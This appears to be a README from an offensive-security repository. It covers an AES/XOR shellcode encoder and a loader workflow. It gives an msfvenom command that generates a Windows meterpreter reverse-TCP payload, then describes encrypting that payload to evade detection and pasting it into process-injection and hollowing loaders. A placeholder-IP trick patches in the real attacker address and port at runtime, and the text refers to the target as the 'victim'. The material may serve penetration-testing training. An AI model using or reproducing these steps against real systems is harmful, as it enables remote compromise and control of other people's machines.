# aes encoder

One file: `shellcode_encoder.py`. **Standalone prep tool — runs on Kali, not on the victim.**

This file is identical to `04-encoders/xor/xor_encoder.py`. Both support XOR and AES modes. The copy here is for convenience.

---

## shellcode_encoder.py

Reads a raw shellcode binary and encrypts it with AES-128-CBC. The output is a byte array ready to paste into your loader's `buf[]`. Also supports XOR mode.

**AES key derivation:** Uses `pyscrypt` (scrypt KDF) with salt `"saltmegood"` to derive a 16-byte key from your password string. A random IV is prepended to the ciphertext.

**Install dependencies (first time):**
```bash
pip3 install pycryptodome pyscrypt
```

**Usage:**
```bash
python3 shellcode_encoder.py <shellcode_file> <password> <xor|aes> [--format <csharp|c|python>]
```

---

## Common workflow (for clrunner.cs, clinject.cs, clhollow.cs)

These loaders use AES with a **placeholder IP trick** — generate shellcode with a fake IP, compile once, patch the real IP at runtime.

```bash
# 1. Generate shellcode with placeholder LHOST (11.11.11.11 = 0x0b0b0b0b)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=11.11.11.11 LPORT=4444 EXITFUNC=thread -f raw -o shell.bin

# 2. AES encrypt with your chosen password
python3 shellcode_encoder.py shell.bin MyPassword123 aes --format csharp

# 3. Paste the output byte array into buf[] in your loader (clrunner.cs etc.)

# 4. In the loader source, set:
#    static string AES_KEY = "MyPassword123";   // must match step 2
#    static string LHOST    = "<YOUR_REAL_IP>";  // real IP patched at runtime
#    static string LPORT    = "443";             // real port patched at runtime
```

At runtime, the loader:
1. Decrypts `buf[]` using AES + your password
2. Scans the decrypted shellcode for the placeholder bytes `\x0b\x0b\x0b\x0b` (11.11.11.11)
3. Replaces them with your real IP bytes
4. Does the same for the placeholder port `\x11\x5c` (4444)
5. Executes

This means **one compiled binary works for any IP/port** — you only need to change the constants in source, not re-encrypt.

---

## Notes

- The AES password must match between the encoder and the loader source code.
- Output is written to `./result/` directory.
- XOR mode works the same as `xor_encoder.py` — see that README for XOR-specific details.
